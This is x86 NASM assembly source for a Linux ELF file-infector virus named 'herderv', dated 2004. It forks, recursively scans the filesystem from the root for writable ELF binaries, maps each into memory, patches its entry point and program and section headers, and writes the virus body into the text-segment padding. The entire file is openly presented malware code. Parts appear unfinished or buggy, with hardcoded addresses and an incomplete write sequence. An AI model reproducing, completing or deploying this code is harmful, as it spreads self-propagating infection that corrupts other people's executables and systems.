;###################################################################
;################### www.cyneox.tk #################################
;###################################################################
;
;
; 9.5.2004 by cyneox
;------------------------------------------------------------------


%define SYS_EXIT 1
%define SYS_FORK 2
%define SYS_WRITE 4
%define SYS_OPEN 5
%define SYS_CLOSE 6
%define SYS_CHDIR 12
%define SYS_GETUID 24
%define SYS_GETGID 47
%define SYS_READDIR 89
%define SYS_MMAP 90
%define SYS_MUNMAP 91
%define SYS_STAT 106
%define SYS_GETCWD 183


%define HERDERV_SZ 0x1000
%define STDOUT 1
%define STAT_SIZE 64 
%define MMAP_SIZE 24
%define DIRENT_SIZE 266
%define STR_STAT_OFF 72  
%define REG_FILE 10q
%define IS_DIR 4q
%define PATH_LENGHT 128 
%define FIRST_DIR 0x2f
%define FILE_STACK 50
%define READ_WRITE 3
%define MAP_PRIVATE 2
%define ELF 0x464c457f


section .data
herder db "i l0v3 h3rd3r",0xa,0
len equ $-herder

section .text
global main

;########################## MAIN #####################################
main:         pusha
              pushf 
              push ebp     ; push ebp; mov ebp,esp; sub esp,0;
              mov esp,ebp  ; VERY IMPORTANT!!! DON'T WRITE "mov ebp,esp"
                           ; !!!! FATAL CAUSES !
	      
       
              ; forking..
              mov eax,SYS_FORK
              mov ebx,0
              int 0x80
              
              ; compare if parent or child is active
              cmp eax,0
              jne parent
	      
	 

;######################## CHILD ######################################
child:	      ; getting uid of user
	      mov eax,SYS_GETUID
	      int 0x80
	     
	      
	      ; pushing uid on stack...
	      push eax          ; [ebp-4]=[eax]=uid
              
	      
	      ; getting gid of user...
	      mov eax,SYS_GETGID
	      int 0x80
	     
	      
	      ; pushing gid on stack...
	      push eax          ; [ebp-8]=gid
	      
	      
	      ; saving "space" for the stat structure needed later...
	      sub esp,STAT_SIZE    ; [ebp-72]=struct stat 
	      push dword 0         ; [ebp-76]
	      push dword FIRST_DIR ; directory to begin to scan; [ebp-80] 
	      push dword 7         ; write permissions...
	     
	      
	      ; scan FIRST_DIR ...
	      call scan
	      
	      add esp,12
	      
	      ; restoring stat structure
	      add esp,64
	      
	      ; restoring uid and gid
	      add esp,8
	      
	      ; here finishes the child
	      jmp exit
	      
;###################### PARENT ########################################
parent:     
            mov eax,SYS_WRITE
	    mov ebx,STDOUT
	    mov ecx,parent
	    mov edx,len
	    int 0x80
   
parent_process:
       pop ebp
       popf
       popa
       jmp old_prog
       
old_prog: 
       mov eax,1
       mov ebx,0
       int 0x80

;###################### SCAN ##########################################
scan:        
              mov esi,esp
              add esi,8            ; [esi+8]=filename
	     
	      mov edi,esp
	      add edi,4            ; [edi+4]=<write permissions>
	      
	      ;mov eax,esi
	      ;call print_string
	      
	      
              ; defining some variables that our virus will need later...
	      
	      ;######## variables ########
	      sub esp,4            ; needed for fd
	      sub esp,1            ; needed for permissions of the host file... 00-07
	      sub esp,1            ; file type : REG_FILE or IS_DIR
	      sub esp,PATH_LENGHT  ; needed for the path name of file....
	      
	      
	      ; we're going to *stat* our filename ...
	      mov eax,SYS_STAT
	      mov ebx,esi        ; pointer to filename
	      mov ecx,ebp
	      sub ecx,STR_STAT_OFF ; ecx -> pointer to our stat structure
	      int 0x80
	      
	      cmp eax,0
	      jge ok_stat
	      jmp err_stat
	      
;#################### OK_STAT ##########################################	      
ok_stat:      ; first of all we must verify the permissions on directory/file
	      
	      mov ebx,ebp
	      sub ebx,STR_STAT_OFF ; point to the stat-structure
	      mov ax,[ebx+8]       ; stat.st_mode=[ebx+8] : *take a look at
                                   ; the stat structure in asm/types.h*
	     
	      
	      mov dx,ax
      	  
	      
	      mov cx,word [ebx+12] ; stat.st_uid=[ebx+12]
	      cmp word cx,[ebp-4]  ; [ebp-4]=uid of user 
	      je u_perms
	      mov cx,word [ebx+14] ; stat.st_gid=[ebx+14]
	      cmp word cx,[ebp-8]  ; [ebp-8]=gid of user
	      je g_perms
	      cmp word [ebp-8],0   ; is this root(uid=0) ???
	      je u_perms
	      
;################### O_PERMS ##########################################	      
	      ; others permissions 
o_perms:      and al,7q 
              jmp perms
 
;################### U_PERMS ########################################## 
              ; user permissions
u_perms:      shr ax,6
              and al,7q
	      jmp perms
	      
;################### G_PERMS #########################################	      
	      ; group permissions
g_perms:      shr ax,3
              and al,7q
	      
;################### PERMS ###########################################	      
perms:        mov byte [esp+PATH_LENGHT+1],al     ; store file permissions
                                                  ; of user
						  					   
						   
;################## F_TYPE ###########################################						   
	      ; now we must verify the file type: REG_FILE or IS_DIR				   
f_type:      
              mov ebx,ebp
              sub ebx,STR_STAT_OFF          ; pointer to stat structure
	      mov ax,[ebx+8]                ; stat.st_mode=[ebx+8]
	      and ax,170000q                ; bit mask for file type
	      shr ax,12
	      mov byte [esp+PATH_LENGHT],al ; store file type
	 
            
	      ; check if REG_FILE or IS_DIR ???
	      
	      mov al,byte [esp+128]
	      cmp al,4q
	      je is_direc           ; jmp if "file"==IS_DIR
	      
	      cmp al,10q
	      je is_reg_file        ; jmp if "file"==REG_FILE
	      jmp err_scan
	      
;###################### IS_REG_FILE #######################################	      
is_reg_file:  ;mov eax,file
              ;call print_string
	      mov ecx,[edi]
	      and cl,2q
	      cmp cl,2q
	      je file_par_per       ; if we have parent permissions on file
              jmp err_scan 
;##################### FILE_PAR_PER #######################################
file_par_per: 
              mov cl,byte [esp+128+1] ; check if we have write permissions
                                      ; on file
              and cl,2q
	      cmp cl,2q
	      je file2
	      jmp err_scan

;#################### FILE2 ##############################################
file2:       
	      call check_file
	      jmp err_scan

;###################### IS_DIR ###########################################
is_direc:     ; saving curent working directory to the stack
              mov eax,SYS_GETCWD
	      mov ebx,esp
	      mov ecx,PATH_LENGHT
	      int 0x80
	      
	      ;mov eax,dir
	      ;call print_string
	      ; open directory...
	    
	      
	      mov eax,SYS_OPEN
	      mov ebx,esi           ; esi=pointer to directoy(filename)
	      mov ecx,0             ; O_RDONLY 
	      mov edx,0
	      int 0x80     
	      
	      
	      cmp eax,0
	      jge ok_dir            ; jump if(eax>=0)
	      jmp err_scan
	      
;~~~~~~~~~~~~~~~~~~~~~~~~ OK_DIR ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	      
ok_dir:       mov [esp+128+2],eax   ; move filedescriptor to our stack
                                    ; variables	
				    
	      ; move to that directory...
	      
	      mov eax,SYS_CHDIR 
	      mov ebx,esi
	      int 0x80
	      
        
	      ; alocate space for the dirent structure
	      sub esp,DIRENT_SIZE
	      
;~~~~~~~~~~~~~~~~~~~~~~~ READDIR ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	      
readdir:      mov eax,SYS_READDIR
              mov ebx,[esp+DIRENT_SIZE+128+2] ; fd
	      mov ecx,esp
	      mov edx,1
	      int 0x80
	      
	      
	      
	      cmp eax,1
	      jne near err_readdir 
	      
	      ; we'll seach every file and then we'll call scan for it
	      cmp word [esp+10],0x002e  ; [esp+10]=dirent.d_name , 0x002e="."
	      je skip
	      cmp word [esp+10],0x2e2e  ; 0x2e2e=".."
	      je skip
	      
	      
	      xor eax,eax
	      mov al,[esp+DIRENT_SIZE+128+1] ; directory permissions
	      add esp,10            ; [esp+10]=dirent.d_name
	      push eax              ; needed because we want to acess @scan
                                    ; the filename and the write permissions...
	      
	      call scan
	      add esp,4             ; restore permissions
	      sub esp,10            ; restore dirent.d_name

	      
   	      
skip:         jmp readdir	      
	      		    
	      
;#################### CHECK_FILE #########################################
check_file:   
              ; allocate stack memory
	      sub esp,FILE_STACK
	      mov ebx,esi
	      mov [esp+FILE_STACK-44],esi   ; pointer to our filename

;################### FOPEN ############################################
fopen:      
              mov eax,SYS_OPEN
              mov ecx,2                     ; 2=O_RDWR 
	      mov edx,0
	      int 0x80
	      
	      cmp eax,0
	      jg no_err
	      jmp fopen_error
	      
;#################### NO_ERROR #########################################	      
no_err:      
              mov [esp+FILE_STACK-4],eax    ; [esp+50-4]=fd 
              
	      ; check files lenght (in the stat structure)
	      mov eax,SYS_STAT
	      mov ebx,esi                   ; esi=filename
	      sub esp,STAT_SIZE
	      mov ecx,esp
	      int 0x80
	      
	      ; storing the file lenght into eax
	      mov eax,[esp+20]              ; [esp+0x14]=filesize
	      add esp,STAT_SIZE             ; restore stack
	      mov [esp+FILE_STACK-8],eax    ; storing filesize on stack
      

;#################### MMAP ###############################################
mmap:        ; here we're going to map out file into mem(*see the syntax in
             ; asm/mmap.h)
	     mov eax,SYS_MMAP
	     mov ecx,[esp+FILE_STACK-8]    ; ecx=file lenght
	     mov edx,[esp+FILE_STACK-4]    ; edx=fd
	     sub esp,MMAP_SIZE
	     mov dword [esp],0             ; int start
	     mov [esp+4],ecx               ; [esp+4]=ecx=file lenght=int len
	     mov dword [esp+8],READ_WRITE  ; prot=READ_WRITE
	     mov dword [esp+12],MAP_PRIVATE; flag=MAP_PRIVATE
	     mov dword [esp+16],edx        ; [esp+16]=edx=int fd
	     mov dword [esp+20],0          ; offset=0
	     mov ebx,esp                   ; ebx=pointer to our
                                           ; mmap_arg_struc - structure
	     int 0x80
	     
	     add esp,MMAP_SIZE              ; restore stack
	     cmp eax,-1
	     jne ok_mmap
	     jmp err_mmap
	     
;#################### OK_MMAP #############################################	     
ok_mmap:     mov [esp+FILE_STACK-12],eax   ; eax=pointer to the mapped file
             
;#################### IS_ELF ##############################################
is_elf:       ; check if our mapped file has "ELF" at the beginning of the
              ; file
	      mov edx,[esp+FILE_STACK-12]  ; edx=pointer to mapped file
	      mov ebx,[edx]                ; [edx] should be "ELF"
	      mov eax,0x464c457f           ; "ELF."
	      cmp ebx,eax
	      je ok_elf 
	      jmp no_elf
;################## OK_ELF ###############################################	      
ok_elf:       
	      
;################ READ_EHDR #############################################	      
read_ehdr:    mov eax,[esp+FILE_STACK-8]  ; file lenght
              cmp eax,0x130
	      jl near err_to_small             ; jmp if(lenght<0x130) 

;############### OK_EHDR ################################################
ok_ehdr:      mov esi,[esp+FILE_STACK-12]
              mov eax,[esi+0x18]
	      mov [esp+FILE_STACK-16],eax ; e_entry
	      mov eax,[esi+0x1c]
	      mov [esp+FILE_STACK-20],eax ; e_phoff
	      mov eax,[esi+0x20]
	      mov [esp+FILE_STACK-24],eax ; e_shoff
	      mov eax,dword [esi+0x2c]
	      and eax,0xffff
	      mov [esp+FILE_STACK-28],eax ; e_phnum
	      mov eax,dword [esi+0x30]
	      and eax,0xffff
	      mov [esp+FILE_STACK-32],eax ; e_shnum
	      
;############## CHK_SPACE #################################################	      
chk_space:    
              mov esi,[esp+FILE_STACK-12]
              mov ebx,[esp+FILE_STACK-20] ; e_phoff
	      add esi,ebx                 ; move to first segment of PHDR
	      mov ecx,[esi+32*3+8]        ; phdr[3].p_vaddr - FLAGS: RW(data
                                          ; segment ???)
	    
	      mov eax,[esi+32*3+16]       ; phdr[3].p_filesz 
  
	      mov ebx,[esi+32*2+16]       ; phdr[2].p_filesz
     
	      mov [esp+FILE_STACK-36],ebx ; phdr[2].p_filesz
	      mov eax,[esi+32*2+8]        ; phdr[2].p_vaddr - FLAGS: RE(text
                                          ; segment !!!)
    
	      add ebx,[esi+32*2+8]        ; phdr[2].p_filesz + phdr[2].p_vaddr
	      sub ecx,ebx
	      
	      ; if(ecx < HERDERV_SZ ) ...
	      mov eax,HERDERV_SZ
	      cmp ecx,eax
	      jl near err_to_small            ; there is no space where we can
                                          ; write herderv :( 
	      
	      mov ebx,[esp+FILE_STACK-28] ; e_phnum
	      cmp ebx,5
	      jl near err_to_small
	      
patch_ehdr:   
              mov ebx,[esp+FILE_STACK-16] ; e_entry
	      add ebx,[esp+FILE_STACK-36] ; phdr[2].p_filesz
	      mov esi,[esp+FILE_STACK-12] ; ptr to mapped file
	      mov [esi+0x18],ebx          ; fix entry point
	      
patch_shoff:  add dword [esi+32],HERDERV_SZ

patch_phdr:   
              mov ecx,[esp+FILE_STACK-28] ; e_phnum
              mov edx,[esp+FILE_STACK-20] ; e_phoff
	      mov esi,[esp+FILE_STACK-12] ; ptr to mapped file
	      add esi,edx                 ; move to the first seg of PHDR
	      mov eax,[esp+FILE_STACK-36] ; phdr[2].p_filesz;off where to
                                          ; insert virus
	      
read_phdr:    cmp dword [esi+4],0         ; is this the .text segment ??? ;
                                          ; p_offset=0=[esi+4]
              jne no_phdrpatch
	      add dword [esi+16],HERDERV_SZ ; patching phdr[2].p_filesz
	      add dword [esi+20],HERDERV_SZ ; patching phdr[2].p_memsz
	      
no_phdrpatch: cmp eax,[esi+4]	      
	      jg dont_patch_ph
	      add dword [esi+4],HERDERV_SZ  ; patching p_offset
	      
dont_patch_ph:
              add esi,0x20                  ; offset to next phdr seg
	      loop read_phdr
	      
patch_shdr:  
              mov ecx,[esp+FILE_STACK-32]   ; e_shnum
              mov edx,[esp+FILE_STACK-24]   ; e_shoff
	      mov esi,[esp+FILE_STACK-12]   ; ptr to mapped file
	      add esi,edx                   ; move to first seg of SHDR
	      mov eax,[esp+FILE_STACK-36]   ; off where to insert virus ;
                                            ; phdr[2].p_filesz
	      
read_shdr:    mov ebx,[esi+16]              ; sh_offset 
              add ebx,[esi+20]              ; sh_size
	      cmp ebx,eax
	      jne no_shdrpatch
	      
	      ; patching .text section 
	      add dword [esi+20],HERDERV_SZ ; patching sh_size 
	      
no_shdrpatch: cmp [esi+16],eax
              jl dont_patch_sh
	      add dword [esi+16],HERDERV_SZ ; patching sh_offset
	      
dont_patch_sh:
             add esi,40                    ; move to next shdr seg in the
                                           ; SHDR table
	     loop read_shdr

own_e_entry: mov esi,dword [0x8048376]     ; current entry_point 
;################## WRITE_VIRUS ###########################################	     
write_virus:	     
	      mov eax,[esp+FILE_STACK-4]   ; our old fd
	      mov [esp+FILE_STACK-2],eax    
	      mov ebx,eax                  ; fd
	      
	      ; writting the patched ehdr to file
	      mov eax,SYS_WRITE
	      mov ecx,[esp+FILE_STACK-12]  ; ptr to our mapped file
	      mov edx,[esp+FILE_STACK-36]  ; virus_offset
	      int 0x80                     ; hehe ... no more way out.. ;))))
	      
	      mov eax,SYS_WRITE
	      mov ecx,esi
	      mov edx,HERDERV_SZ         
	      int 0x80
	      
	      mov eax,19                   ; lseek()
	      mov ecx,[esp+FILE_STACK-36]
	      add ecx,HERDERV_SZ
	      mov edx,0                    ; SEEK_SET
	      int 0x80
	      
	      mov ecx,[esp+FILE_STACK-36]
	      mov edx,[esp+FILE_STACK-8]   ; file lenght
	      sub edx,ecx                  ; remaining lenght to write
	      mov eax,SYS_WRITE
	      add ecx,[esp+FILE_STACK-12]  ; ptr to mapped file
	      
	      ; now we must fix the old entry point so that prog can execute
	      mov eax,19
	      mov ecx,[esp+FILE_STACK-36]  
	      add ecx,0x127
	      mov edx,0
	      int 0x80
	      
	      add ecx,0x808504
	      sub edx,ecx
	      push edx 
	      mov ecx,esp
	      mov edx,4
	      mov eax,SYS_WRITE
	      int 0x80
	      add esp,4
	      
	      
	      
	      
              
	      
           					  
	      
	      
              
	      


err_to_small:
;#################### NO_ELF ##############################################
no_elf:      
              mov eax,SYS_MUNMAP
	      mov ebx,[esp+FILE_STACK-12] ; ebx=pointer to mapped file
	      mov ecx,[esp+FILE_STACK-8]  ; ecx=map lenght=file lenght
	      int 0x80
              
;#################### ERR_MMAP ############################################
err_mmap:     
              mov eax,SYS_CLOSE
	      mov ebx,[esp+FILE_STACK-4]
	      int 0x80
;#################### FOPEN_ERROR #########################################
fopen_error: 
              add esp,FILE_STACK
	      ret
;#################### ERR_READDIR #########################################
err_readdir:  add esp,DIRENT_SIZE   ; restore stack
              mov eax,SYS_CLOSE
	      mov ebx,[esp+128+2]   ; fd
	      int 0x80
	      
	      ; chdir to previous curent dir
	      mov eax,SYS_CHDIR
	      mov ebx,esp
	      int 0x80
	      
	      ;mov eax,dir_err
	      ;call print_string
	      
              
;###################### ERR_STAT & ERR_SCAN ###############################	      
err_stat:     
err_scan:     ;mov eax,scan_e
              ;call print_string
              add esp,134           ; restore stack used for the ##### variables #####	      
	      ret                   ; return to main
	      
;###################### EXIT #############################################
exit:   
	     mov eax,SYS_EXIT
             int 0x80
